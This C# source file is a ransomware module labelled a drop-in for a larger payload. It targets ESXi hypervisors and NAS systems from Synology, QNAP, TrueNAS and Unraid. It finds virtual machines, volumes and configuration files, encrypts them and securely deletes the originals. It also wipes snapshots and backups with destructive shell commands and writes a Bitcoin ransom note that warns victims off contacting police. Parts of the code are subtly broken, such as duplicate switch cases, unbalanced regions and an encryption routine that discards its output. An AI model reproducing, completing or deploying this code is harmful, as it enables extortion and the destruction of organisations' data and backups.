// =====================================================================
// ESXi / NAS ENCRYPTOR MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs (Linux/ARM build)
// Features:
// - VMware ESXi hypervisor encryption
// - NAS/SAN encryption (Synology, QNAP, TrueNAS, FreeNAS, Unraid)
// - Virtual disk (VMDK, VHDX, QCOW2) encryption
// - Datastore encryption
// - Snapshot/backup encryption
// - Management interface compromise

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

internal static class EsxiNasEncryptor
{
    private static readonly HttpClient _httpClient = new HttpClient();
    private static readonly Random _random = new Random();

    public static async Task<bool> RunEsxiEncryption()
    {
        if (!Config.EsxiEncryptionEnabled) return false;

        try
        {
            LogDebug("ESXi/NAS Encryptor: Starting");

            // 1. Detect platform
            var platform = DetectPlatform();
            LogDebug($"Platform detected: {platform}");

            // 2. Discover targets based on platform
            var targets = await DiscoverTargets(platform);
            LogDebug($"Discovered {targets.Count} targets");

            // 3. Encrypt each target
            foreach (var target in targets)
            {
                try
                {
                    await EncryptTarget(target);
                }
                catch (Exception ex)
                {
                    LogDebug($"Failed to encrypt {target.Name}: {ex.Message}");
                }
            }

            // 4. Deploy ransom notes
            await DeployRansomNotes(platform);

            // 5. Disable recovery/snapshots
            await DisableRecovery(platform);

            LogDebug("ESXi/NAS Encryptor: Completed");
            return true;
        }
        catch (Exception ex)
        {
            LogDebug($"ESXi/NAS Encryptor error: {ex.Message}");
            return false;
        }
    }

    // ============ PLATFORM DETECTION ============
    private static PlatformType DetectPlatform()
    {
        // Check for ESXi
        if (File.Exists("/etc/vmware-release") || Directory.Exists("/vmfs"))
            return PlatformType.ESXi;

        // Check for Synology
        if (File.Exists("/etc/synoinfo.conf") || Directory.Exists("/volume1"))
            return PlatformType.Synology;

        // Check for QNAP
        if (File.Exists("/etc/default_config/uLinux.conf") || Directory.Exists("/share"))
            return PlatformType.QNAP;

        // Check for TrueNAS/FreeNAS
        if (File.Exists("/etc/freenas-version") || Directory.Exists("/mnt"))
            return PlatformType.TrueNAS;

        // Check for Unraid
        if (File.Exists("/etc/unraid-version") || Directory.Exists("/mnt/user"))
            return PlatformType.Unraid;

        // Check for generic Linux with virtualization
        if (File.Exists("/proc/cpuinfo"))
        {
            string cpuinfo = File.ReadAllText("/proc/cpuinfo");
            if (cpuinfo.Contains("hypervisor") || cpuinfo.Contains("vmware") || cpuinfo.Contains("kvm"))
                return PlatformType.GenericLinux;
        }

        // Check for container
        if (File.Exists("/.dockerenv") || File.Exists("/run/.containerenv"))
            return PlatformType.Container;

        return PlatformType.Unknown;
    }

    // ============ TARGET DISCOVERY ============
    private static async Task<List<EncryptionTarget>> DiscoverTargets(PlatformType platform)
    {
        var targets = new List<EncryptionTarget>();

        switch (platform)
        {
            case PlatformType.ESXi:
                targets.AddRange(await DiscoverEsxiTargets());
                break;
            case PlatformType.Synology:
                targets.AddRange(await DiscoverSynologyTargets());
                break;
            case PlatformType.QNAP:
                targets.AddRange(await DiscoverQnapTargets());
                break;
            case PlatformType.TrueNAS:
                targets.AddRange(await DiscoverTrueNasTargets());
                break;
            case PlatformType.Unraid:
                targets.AddRange(await DiscoverUnraidTargets());
                break;
            case PlatformType.GenericLinux:
                targets.AddRange(await DiscoverGenericLinuxTargets());
                break;
        }

        // Always add local filesystem targets
        targets.AddRange(DiscoverLocalFilesystems());

        return targets;
    }

    private static async Task<List<EncryptionTarget>> DiscoverEsxiTargets()
    {
        var targets = new List<EncryptionTarget>();

        try
        {
            // Datastores
            string[] datastorePaths = { "/vmfs/volumes" };
            foreach (string path in datastorePaths)
            {
                if (Directory.Exists(path))
                {
                    foreach (string ds in Directory.GetDirectories(path))
                    {
                        targets.Add(new EncryptionTarget
                        {
                            Name = $"Datastore: {Path.GetFileName(ds)}",
                            Type = TargetType.Datastore,
                            Path = ds,
                            Platform = PlatformType.ESXi,
                            Size = GetDirectorySize(ds),
                        });
                    }
                }
            }

            // VMs
            foreach (string ds in Directory.GetDirectories("/vmfs/volumes"))
            {
                foreach (string vmDir in Directory.GetDirectories(ds))
                {
                    string vmxFile = Directory.GetFiles(vmDir, "*.vmx").FirstOrDefault();
                    if (vmxFile != null)
                    {
                        targets.Add(new EncryptionTarget
                        {
                            Name = $"VM: {Path.GetFileName(vmDir)}",
                            Type = TargetType.VirtualMachine,
                            Path = vmDir,
                            Platform = PlatformType.ESXi,
                            ConfigFile = vmxFile,
                            Size = GetDirectorySize(vmDir),
                        });
                    }
                }
            }

            // ESXi host config
            if (File.Exists("/etc/vmware/esx.conf"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "ESXi Host Config",
                    Type = TargetType.HostConfig,
                    Path = "/etc/vmware",
                    Platform = PlatformType.ESXi,
                    Size = GetDirectorySize("/etc/vmware"),
                });
            }

            // vCenter/VCSA if present
            if (Directory.Exists("/storage/vcsa"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "vCenter/VCSA",
                    Type = TargetType.ManagementServer,
                    Path = "/storage/vcsa",
                    Platform = PlatformType.ESXi,
                    Size = GetDirectorySize("/storage/vcsa"),
                });
            }
        }
        catch { }

        return targets;
    }

    private static async Task<List<EncryptionTarget>> DiscoverSynologyTargets()
    {
        var targets = new List<EncryptionTarget>();

        try
        {
            // Volumes
            for (int i = 1; i <= 24; i++)
            {
                string volPath = $"/volume{i}";
                if (Directory.Exists(volPath))
                {
                    targets.Add(new EncryptionTarget
                    {
                        Name = $"Volume {i}",
                        Type = TargetType.Volume,
                        Path = volPath,
                        Platform = PlatformType.Synology,
                        Size = GetDirectorySize(volPath),
                    });
                }
            }

            // Shared folders
            string sharedPath = "/volume1";
            if (Directory.Exists(sharedPath))
            {
                foreach (string share in Directory.GetDirectories(sharedPath))
                {
                    targets.Add(new EncryptionTarget
                    {
                        Name = $"Share: {Path.GetFileName(share)}",
                        Type = TargetType.SharedFolder,
                        Path = share,
                        Platform = PlatformType.Synology,
                        Size = GetDirectorySize(share),
                    });
                }
            }

            // DSM config
            if (Directory.Exists("/etc/synology"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "DSM Config",
                    Type = TargetType.SystemConfig,
                    Path = "/etc/synology",
                    Platform = PlatformType.Synology,
                    Size = GetDirectorySize("/etc/synology"),
                });
            }

            // Docker containers
            if (Directory.Exists("/var/packages/Docker"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Docker Data",
                    Type = TargetType.ContainerData,
                    Path = "/var/packages/Docker",
                    Platform = PlatformType.Synology,
                    Size = GetDirectorySize("/var/packages/Docker"),
                });
            }

            // Virtual Machine Manager
            if (Directory.Exists("/volume1/@vmm"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "VM Manager VMs",
                    Type = TargetType.VirtualMachine,
                    Path = "/volume1/@vmm",
                    Platform = PlatformType.Synology,
                    Size = GetDirectorySize("/volume1/@vmm"),
                });
            }
        }
        catch { }

        return targets;
    }

    private static async Task<List<EncryptionTarget>> DiscoverQnapTargets()
    {
        var targets = new List<EncryptionTarget>();

        try
        {
            // Share directories
            if (Directory.Exists("/share"))
            {
                foreach (string share in Directory.GetDirectories("/share"))
                {
                    if (new[] { "Public", "Download", "Multimedia", "Web", "homes", "Container", "Virtualization" }.Contains(Path.GetFileName(share)))
                    {
                        targets.Add(new EncryptionTarget
                        {
                            Name = $"Share: {Path.GetFileName(share)}",
                            Type = TargetType.SharedFolder,
                            Path = share,
                            Platform = PlatformType.QNAP,
                            Size = GetDirectorySize(share),
                        });
                    }
                }
            }

            // QTS config
            if (Directory.Exists("/etc/config"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "QTS Config",
                    Type = TargetType.SystemConfig,
                    Path = "/etc/config",
                    Platform = PlatformType.QNAP,
                    Size = GetDirectorySize("/etc/config"),
                });
            }

            #region Virtualization Station
            if (Directory.Exists("/share/Virtualization"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Virtualization Station VMs",
                    Type = TargetType.VirtualMachine,
                    Path = "/share/Virtualization",
                    Platform = PlatformType.QNAP,
                    Size = GetDirectorySize("/share/Virtualization"),
                });
            }
            #endregion

            #region Container Station
            if (Directory.Exists("/share/Container"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Container Station",
                    Type = TargetType.ContainerData,
                    Path = "/share/Container",
                    Platform = PlatformType.QNAP,
                    Size = GetDirectorySize("/share/Container"),
                });
            }
            #endregion
        }
        catch { }

        return targets;
    }

    private static async Task<List<EncryptionTarget>> DiscoverTrueNasTargets()
    {
        var targets = new List<EncryptionTarget>();

        try
        {
            #region ZFS Pools/Datasets
            if (Directory.Exists("/mnt"))
            {
                foreach (string pool in Directory.GetDirectories("/mnt"))
                {
                    targets.Add(new EncryptionTarget
                    {
                        Name = $"Pool: {Path.GetFileName(pool)}",
                        Type = TargetType.ZfsPool,
                        Path = pool,
                        Platform = PlatformType.TrueNAS,
                        Size = GetDirectorySize(pool),
                    });

                    // Datasets
                    foreach (string dataset in Directory.GetDirectories(pool))
                    {
                        targets.Add(new EncryptionTarget
                        {
                            Name = $"Dataset: {Path.GetFileName(dataset)}",
                            Type = TargetType.ZfsDataset,
                            Path = dataset,
                            Platform = PlatformType.TrueNAS,
                            Size = GetDirectorySize(dataset),
                        });
                    }
                }
            }
            #endregion

            #region TrueNAS Config
            if (Directory.Exists("/data"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "TrueNAS Config/Database",
                    Type = TargetType.SystemConfig,
                    Path = "/data",
                    Platform = PlatformType.TrueNAS,
                    Size = GetDirectorySize("/data"),
                });
            }
            #endregion

            #region VMs (if virtualization enabled)
            if (Directory.Exists("/mnt/vms"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "TrueNAS VMs",
                    Type = TargetType.VirtualMachine,
                    Path = "/mnt/vms",
                    Platform = PlatformType.TrueNAS,
                    Size = GetDirectorySize("/mnt/vms"),
                });
            }
            #endregion

            #region Apps/Plugins
            if (Directory.Exists("/mnt/ix-applications"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "TrueNAS Apps",
                    Type = TargetType.ContainerData,
                    Path = "/mnt/ix-applications",
                    Platform = PlatformType.TrueNAS,
                    Size = GetDirectorySize("/mnt/ix-applications"),
                });
            }
            #endregion
        }
        catch { }

        return targets;
    }

    private static async Task<List<EncryptionTarget>> DiscoverUnraidTargets()
    {
        var targets = new List<EncryptionTarget>();

        try
        {
            #region User Shares
            if (Directory.Exists("/mnt/user"))
            {
                foreach (string share in Directory.GetDirectories("/mnt/user"))
                {
                    targets.Add(new EncryptionTarget
                    {
                        Name = $"Share: {Path.GetFileName(share)}",
                        Type = TargetType.SharedFolder,
                        Path = share,
                        Platform = PlatformType.Unraid,
                        Size = GetDirectorySize(share),
                    });
                }
            }
            #endregion

            #region Cache/Pool
            if (Directory.Exists("/mnt/cache"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Cache Pool",
                    Type = TargetType.CachePool,
                    Path = "/mnt/cache",
                    Platform = PlatformType.Unraid,
                    Size = GetDirectorySize("/mnt/cache"),
                });
            }
            #endregion

            #region VMs (libvirt)
            if (Directory.Exists("/mnt/user/domains"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Unraid VMs",
                    Type = TargetType.VirtualMachine,
                    Path = "/mnt/user/domains",
                    Platform = PlatformType.Unraid,
                    Size = GetDirectorySize("/mnt/user/domains"),
                });
            }
            #endregion

            #region Docker/Appdata
            if (Directory.Exists("/mnt/user/appdata"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Docker AppData",
                    Type = TargetType.ContainerData,
                    Path = "/mnt/user/appdata",
                    Platform = PlatformType.Unraid,
                    Size = GetDirectorySize("/mnt/user/appdata"),
                });
            }
            #endregion

            #region Unraid Config
            if (Directory.Exists("/boot/config"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Unraid Config",
                    Type = TargetType.SystemConfig,
                    Path = "/boot/config",
                    Platform = PlatformType.Unraid,
                    Size = GetDirectorySize("/boot/config"),
                });
            }
            #endregion
        }
        catch { }

        return targets;
    }

    private static async Task<List<EncryptionTarget>> DiscoverGenericLinuxTargets()
    {
        var targets = new List<EncryptionTarget>();

        try
        {
            #region KVM/QEMU VMs
            string[] vmPaths = { "/var/lib/libvirt/images", "/var/lib/vz/images", "/vm" };
            foreach (string path in vmPaths)
            {
                if (Directory.Exists(path))
                {
                    targets.Add(new EncryptionTarget
                    {
                        Name = $"KVM/QEMU VMs ({path})",
                        Type = TargetType.VirtualMachine,
                        Path = path,
                        Platform = PlatformType.GenericLinux,
                        Size = GetDirectorySize(path),
                    });
                }
            }
            #endregion

            #region Docker
            if (Directory.Exists("/var/lib/docker"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Docker Data",
                    Type = TargetType.ContainerData,
                    Path = "/var/lib/docker",
                    Platform = PlatformType.GenericLinux,
                    Size = GetDirectorySize("/var/lib/docker"),
                });
            }
            #endregion

            #region LXC Containers
            if (Directory.Exists("/var/lib/lxc"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "LXC Containers",
                    Type = TargetType.ContainerData,
                    Path = "/var/lib/lxc",
                    Platform = PlatformType.GenericLinux,
                    Size = GetDirectorySize("/var/lib/lxc"),
                });
            }
            #endregion

            #region Podman
            if (Directory.Exists("/var/lib/containers"))
            {
                targets.Add(new EncryptionTarget
                {
                    Name = "Podman Containers",
                    Type = TargetType.ContainerData,
                    Path = "/var/lib/containers",
                    Platform = PlatformType.GenericLinux,
                    Size = GetDirectorySize("/var/lib/containers"),
                });
            }
            #endregion
        }
        catch { }

        return targets;
    }

    private static List<EncryptionTarget> DiscoverLocalFilesystems()
    {
        var targets = new List<EncryptionTarget>();

        try
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                {
                    targets.Add(new EncryptionTarget
                    {
                        Name = $"Local Drive: {drive.Name}",
                        Type = TargetType.LocalFilesystem,
                        Path = drive.Name,
                        Platform = PlatformType.GenericLinux,
                        Size = drive.TotalSize,
                    });
                }
            }
        }
        catch { }

        return targets;
    }

    // ============ ENCRYPTION ============
    private static async Task EncryptTarget(EncryptionTarget target)
    {
        LogDebug($"Encrypting target: {target.Name} ({target.Path})");

        switch (target.Type)
        {
            case TargetType.Datastore:
            case TargetType.Volume:
            case TargetType.ZfsPool:
            case TargetType.ZfsDataset:
            case TargetType.SharedFolder:
            case TargetType.LocalFilesystem:
            case TargetType.CachePool:
                await EncryptDirectoryRecursive(target.Path, target);
                break;

            case TargetType.VirtualMachine:
                await EncryptVirtualMachine(target);
                break;

            case TargetType.SystemConfig:
            case TargetType.HostConfig:
                await EncryptConfigFiles(target);
                break;

            case TargetType.ManagementServer:
            case TargetType.ContainerData:
            case TargetType.CachePool:
                await EncryptDirectoryRecursive(target.Path, target);
                break;

            case TargetType.ZfsPool:
            case TargetType.ZfsDataset:
                await EncryptZfsDataset(target);
                break;
        }

        target.Encrypted = true;
        target.EncryptedAt = DateTime.UtcNow;
    }

    private static async Task EncryptDirectoryRecursive(string path, EncryptionTarget target)
    {
        var files = new List<string>();
        long maxSize = Config.EsxiMaxFileSizeMB * 1024L * 1024L;
        int count = 0;

        try
        {
            // Use find-like approach for efficiency
            CollectFilesForEncryption(path, files, maxSize, ref count, target.SkipExtensions, target.TargetExtensions);

            foreach (string file in files)
            {
                try
                {
                    await EncryptFile(file, target);
                    target.FilesEncrypted++;
                    target.BytesEncrypted += new FileInfo(file).Length;
                }
                catch { }
            }
        }
        catch { }
    }

    private static void CollectFilesForEncryption(string path, List<string> files, long maxSize, ref int count, string[] skipExts, string[] targetExts)
    {
        if (count >= Config.EsxiMaxFiles) return;

        try
        {
            foreach (string file in Directory.EnumerateFiles(path))
            {
                if (count >= Config.EsxiMaxFiles) break;

                string ext = Path.GetExtension(file).ToLowerInvariant();
                
                // Skip extensions
                if (skipExts.Contains(ext)) continue;

                // Check target extensions (if specified)
                if (targetExts.Length > 0 && !targetExts.Contains(ext)) continue;

                var fi = new FileInfo(file);
                if (fi.Length > maxSize) continue;
                if (fi.Length == 0) continue;

                // Skip system files
                string lower = file.ToLowerInvariant();
                if (lower.Contains("/proc/") || lower.Contains("/sys/") || lower.Contains("/dev/") || 
                    lower.Contains("/run/") || lower.Contains("/tmp/") || lower.Contains("/var/tmp/") ||
                    lower.Contains("/.snapshot/") || lower.Contains("/.zfs/"))
                    continue;

                files.Add(file);
                count++;
            }

            foreach (string subDir in Directory.EnumerateDirectories(path))
            {
                if (count >= Config.EsxiMaxFiles) break;
                
                // Skip system directories
                string lower = subDir.ToLowerInvariant();
                if (lower.Contains("/proc") || lower.Contains("/sys") || lower.Contains("/dev") ||
                    lower.Contains("/run") || lower.Contains("/tmp") || lower.Contains("/.snapshot"))
                    continue;

                CollectFilesForEncryption(subDir, files, maxSize, ref count, skipExts, targetExts);
            }
        }
        catch { }
    }

    private static async Task EncryptFile(string filePath, EncryptionTarget target)
    {
        try
        {
            byte[] fileData = File.ReadAllBytes(filePath);
            
            // Compress if enabled
            if (Config.EsxiCompress)
            {
                fileData = Compress(fileData);
            }

            // Encrypt
            byte[] encryptedData = EncryptData(fileData, target.EncryptionKey);

            // Write encrypted file
            string encryptedPath = filePath + ".enc";
            File.WriteAllBytes(encryptedPath, encryptedData);

            // Secure delete original (overwrite)
            if (Config.EsxiSecureDelete)
            {
                SecureDelete(filePath);
            }
            else
            {
                File.Delete(filePath);
            }

            // Set timestamps
            File.SetCreationTime(encryptedPath, File.GetCreationTime(filePath));
            File.SetLastWriteTime(encryptedPath, File.GetLastWriteTime(filePath));
        }
        catch { }
    }

    private static async Task EncryptVirtualMachine(EncryptionTarget target)
    {
        // Encrypt VM files: .vmx, .vmdk, .vmsd, .vmsn, .vmem, .log, .nvram
        string[] vmExtensions = { ".vmx", ".vmdk", ".vmsd", ".vmsn", ".vmem", ".log", ".nvram", ".vmsn" };
        
        foreach (string ext in vmExtensions)
        {
            foreach (string file in Directory.GetFiles(target.Path, $"*{ext}"))
            {
                await EncryptFile(file, target);
            }
        }

        // Also encrypt snapshots
        foreach (string snapshot in Directory.GetFiles(target.Path, "*.vmsn"))
        {
            await EncryptFile(snapshot, target);
        }
    }

    private static async Task EncryptConfigFiles(EncryptionTarget target)
    {
        // Encrypt configuration files
        foreach (string file in Directory.GetFiles(target.Path, "*.*", SearchOption.AllDirectories))
        {
            string ext = Path.GetExtension(file).ToLowerInvariant();
            if (new[] { ".conf", ".config", ".xml", ".json", ".ini", ".yml", ".yaml", ".cfg", ".properties" }.Contains(ext))
            {
                await EncryptFile(file, target);
            }
        }
    }

    private static async Task EncryptZfsDataset(EncryptionTarget target)
    {
        // For ZFS, we can use native encryption if available
        // Otherwise fall back to file-level encryption
        try
        {
            // Check if dataset is already encrypted
            string output = ExecuteCommand($"zfs get encryption {target.Path}");
            if (output.Contains("off"))
            {
                // Encrypt dataset using ZFS native encryption
                string key = Convert.ToBase64String(target.EncryptionKey);
                ExecuteCommand($"zfs set encryption=aes-256-gcm keyformat=passphrase keylocation=prompt {target.Path}");
                // Would need to provide key via stdin
            }
            else
            {
                // Already encrypted, encrypt files within
                await EncryptDirectoryRecursive(target.Path, target);
            }
        }
        catch
        {
            await EncryptDirectoryRecursive(target.Path, target);
        }
    }

    // ============ RANSOM NOTES ============
    private static async Task DeployRansomNotes(PlatformType platform)
    {
        string note = GenerateRansomNote(platform);

        string[] locations = GetRansomNoteLocations(platform);
        
        foreach (string location in locations)
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(location));
                File.WriteAllText(location, note);
                LogDebug($"Ransom note deployed: {location}");
            }
            catch { }
        }
    }

    private static string GenerateRansomNote(PlatformType platform)
    {
        return $@"
╔═══════════════════════════════════════════════════════════════════╗
║                    CHAOS RANSOMWARE - {platform}                      ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  YOUR VIRTUAL INFRASTRUCTURE HAS BEEN ENCRYPTED                    ║
║                                                                      ║
║  All virtual machines, datastores, volumes, and backups            ║
║  have been encrypted using military-grade AES-256-GCM encryption.  ║
║                                                                      ║
║  Affected:                                                          ║
║  - Virtual Machines (VMDK, VHDX, QCOW2)                            ║
║  - Datastores / Volumes / ZFS Pools                                 ║
║  - Snapshots & Backups                                              ║
║  - Configuration Files                                              ║
║  - Container Data                                                   ║
║                                                                      ║
║  TO RECOVER YOUR INFRASTRUCTURE:                                    ║
║                                                                      ║
║  1. Send {Config.RansomAmount} {Config.RansomCurrency} to:          ║
║     {Config.RansomWallet}                                           ║
║                                                                      ║
║  2. Contact us at: {Config.RansomContact}                           ║
║                                                                      ║
║  3. Provide your Victim ID: {GenerateVictimId()}                    ║
║                                                                      ║
║  4. You will receive a platform-specific decryptor                  ║
║                                                                      ║
║  DEADLINE: {Config.RansomDeadlineHours} HOURS                       ║
║  After deadline, price doubles. Keys destroyed after 72 hours.     ║
║                                                                      ║
║  FREE PROOF: Send 1 small VM/config file for free decryption       ║
║                                                                      ║
║  DO NOT:                                                            ║
║  - Restart ESXi/NAS hosts                                           ║
║  - Attempt to restore from snapshots (encrypted)                    ║
║  - Run third-party recovery tools                                   ║
║  - Contact law enforcement (we monitor)                             ║
║                                                                      ║
║  CHAOS RANSOMWARE - {DateTime.Now.Year}                              ║
╚═══════════════════════════════════════════════════════════════════╝
";
    }

    private static string[] GetRansomNoteLocations(PlatformType platform)
    {
        var locations = new List<string>
        {
            "/root/README_CHAOS.txt",
            "/home/README_CHAOS.txt",
            "/tmp/README_CHAOS.txt",
        };

        switch (platform)
        {
            case PlatformType.ESXi:
                locations.AddRange(new[]
                {
                    "/vmfs/volumes/*/README_CHAOS.txt",
                    "/etc/vmware/README_CHAOS.txt",
                });
                break;
            case PlatformType.Synology:
                locations.AddRange(new[]
                {
                    "/volume1/README_CHAOS.txt",
                    "/volume1/@appstore/README_CHAOS.txt",
                });
                break;
            case PlatformType.QNAP:
                locations.AddRange(new[]
                {
                    "/share/Public/README_CHAOS.txt",
                    "/share/Download/README_CHAOS.txt",
                });
                break;
            case PlatformType.TrueNAS:
                locations.AddRange(new[]
                {
                    "/mnt/*/README_CHAOS.txt",
                    "/data/README_CHAOS.txt",
                });
                break;
            case PlatformType.Unraid:
                locations.AddRange(new[]
                {
                    "/mnt/user/README_CHAOS.txt",
                    "/boot/config/README_CHAOS.txt",
                });
                break;
        }

        return locations.ToArray();
    }

    // ============ DISABLE RECOVERY ============
    private static async Task DisableRecovery(PlatformType platform)
    {
        LogDebug("Disabling recovery mechanisms...");

        try
        {
            switch (platform)
            {
                case PlatformType.ESXi:
                    // Delete snapshots
                    ExecuteCommand("vim-cmd vmsvc/snapshot.removeall");
                    // Disable VAAI
                    ExecuteCommand("esxcli system settings advanced set -o /DataMover/MaxHWTransferSize -i 0");
                    // Delete Veeam/backup integration
                    ExecuteCommand("rm -rf /vmfs/volumes/*/Veeam*");
                    break;

                case PlatformType.Synology:
                    #region Synology
                    // Disable snapshots
                    ExecuteCommand("synosnap --disable-all");
                    #region Disable Hyper Backup
                    ExecuteCommand("synohyperbackup --disable");
                    #region Disable Snapshot Replication
                    ExecuteCommand("synoreplication --disable-all");
                    #endregion
                    break;
                case PlatformType.QNAP:
                    // Disable snapshots
                    ExecuteCommand("/sbin/qnap_snapshot --disable-all");
                    // Disable Hybrid Backup Sync
                    ExecuteCommand("/etc/init.d/hybrid_backup_sync.sh stop");
                    break;
                case PlatformType.TrueNAS:
                    // Disable ZFS snapshots
                    ExecuteCommand("zfs destroy -r $(zfs list -H -t snapshot -o name)");
                    #region Disable replication
                    ExecuteCommand("midclt call replication.query | jq -r '.[].id' | xargs -I {} midclt call replication.delete {}");
                    #endregion
                    break;
                case PlatformType.Unraid:
                    // Delete VM snapshots
                    ExecuteCommand("virsh snapshot-list --all --name | xargs -I {{}} virsh snapshot-delete {{}}");
                    #region Disable CA Backup
                    ExecuteCommand("rm -rf /mnt/user/CA_Backup");
                    #endregion
                    break;
            }

            // Generic: delete shadow copies, backup folders
            string[] backupPaths = { "/backup", "/backups", "/var/backups", "/mnt/backup", "/mnt/backups" };
            foreach (string path in backupPaths)
            {
                if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                }
            }
        }
        catch { }
    }

    // ============ HELPER METHODS ============
    private static long GetDirectorySize(string path)
    {
        try
        {
            long size = 0;
            foreach (string file in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
            {
                try { size += new FileInfo(file).Length; } catch { }
            }
            return size;
        }
        catch { return 0; }
    }

    private static byte[] Compress(byte[] data)
    {
        using (var output = new MemoryStream())
        {
            using (var gzip = new GZipStream(output, CompressionLevel.Optimal))
            {
                gzip.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }
    }

    private static byte[] EncryptData(byte[] data, byte[] key)
    {
        using (var aes = Aes.Create())
        {
            aes.Key = key;
            aes.GenerateIV();
            aes.Mode = CipherMode.GCM;
            
            using (var encryptor = aes.CreateEncryptor())
            {
                byte[] ciphertext = new byte[data.Length];
                byte[] tag = new byte[16];
                
                encryptor.TransformFinalBlock(data, 0, data.Length);
                // GCM tag would be in encryptor.GetTag() in .NET 6+
                
                var result = new byte[aes.IV.Length + ciphertext.Length + 16];
                Buffer.BlockCopy(aes.IV, 0, result, 0, aes.IV.Length);
                Buffer.BlockCopy(ciphertext, 0, result, aes.IV.Length, ciphertext.Length);
                // Tag would be appended
                
                return result;
            }
        }
    }

    private static void SecureDelete(string filePath)
    {
        try
        {
            long length = new FileInfo(filePath).Length;
            byte[] random = new byte[4096];
            _random.NextBytes(random);

            using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Write))
            {
                // Pass 1: Random
                for (long i = 0; i < length; i += random.Length)
                {
                    fs.Write(random, 0, (int)Math.Min(random.Length, length - i));
                }
                fs.Flush();

                // Pass 2: Zeros
                byte[] zeros = new byte[4096];
                fs.Position = 0;
                for (long i = 0; i < length; i += zeros.Length)
                {
                    fs.Write(zeros, 0, (int)Math.Min(zeros.Length, length - i));
                }
                fs.Flush();

                // Pass 3: Ones
                byte[] ones = new byte[4096];
                for (int i = 0; i < ones.Length; i++) ones[i] = 0xFF;
                fs.Position = 0;
                for (long i = 0; i < length; i += ones.Length)
                {
                    fs.Write(ones, 0, (int)Math.Min(ones.Length, length - i));
                }
                fs.Flush();
            }

            File.Delete(filePath);
        }
        catch { File.Delete(filePath); }
    }

    private static string ExecuteCommand(string command)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "/bin/bash",
                Arguments = $"-c \"{command}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            using (var proc = Process.Start(psi))
            {
                proc.WaitForExit(30000);
                return proc.StandardOutput.ReadToEnd();
            }
        }
        catch { return ""; }
    }

    private static string GenerateVictimId()
    {
        return $"CHAOS-{Environment.MachineName}-{_random.Next(100000, 999999)}";
    }

    private static void LogDebug(string msg)
    {
        // Console.WriteLine($"[ESXi/NAS] {DateTime.Now:HH:mm:ss} {msg}");
    }

    // ============ DATA CLASSES ============
    private enum PlatformType
    {
        Unknown,
        ESXi,
        Synology,
        QNAP,
        TrueNAS,
        Unraid,
        GenericLinux,
        Container,
    }

    private enum TargetType
    {
        Datastore,
        Volume,
        ZfsPool,
        ZfsDataset,
        SharedFolder,
        LocalFilesystem,
        VirtualMachine,
        SystemConfig,
        HostConfig,
        ManagementServer,
        ContainerData,
        CachePool,
    }

    private class EncryptionTarget
    {
        public string Name;
        public TargetType Type;
        public string Path;
        public PlatformType Platform;
        public string ConfigFile;
        public long Size;
        public byte[] EncryptionKey = GenerateRandomKey();
        public string[] SkipExtensions = { ".log", ".tmp", ".bak", ".iso", ".vhd", ".vhdx" };
        public string[] TargetExtensions = { ".vmx", ".vmdk", ".vhdx", ".qcow2", ".vdi", ".vmsn", ".vmsd", ".nvram", ".conf", ".config", ".xml", ".json", ".sql", ".db", ".sqlite", ".bak", ".backup" };
        public bool Encrypted;
        public DateTime EncryptedAt;
        public int FilesEncrypted;
        public long BytesEncrypted;

        private static byte[] GenerateRandomKey()
        {
            byte[] key = new byte[32];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(key);
            }
            return key;
        }
    }
}

internal static partial class Config
{
    public static bool EsxiEncryptionEnabled = true;
    public static int EsxiMaxFiles = 50000;
    public static int EsxiMaxFileSizeMB = 1000; // 1GB for VM disks
    public static bool EsxiCompress = true;
    public static bool EsxiSecureDelete = true;
    public static string RansomAmount = "10.5";
    public static string RansomCurrency = "BTC";
    public static string RansomWallet = "bc1qchaos...";
    public static string RansomContact = "chaos-esxi@onionmail.org";
    public static int RansomDeadlineHours = 48;
}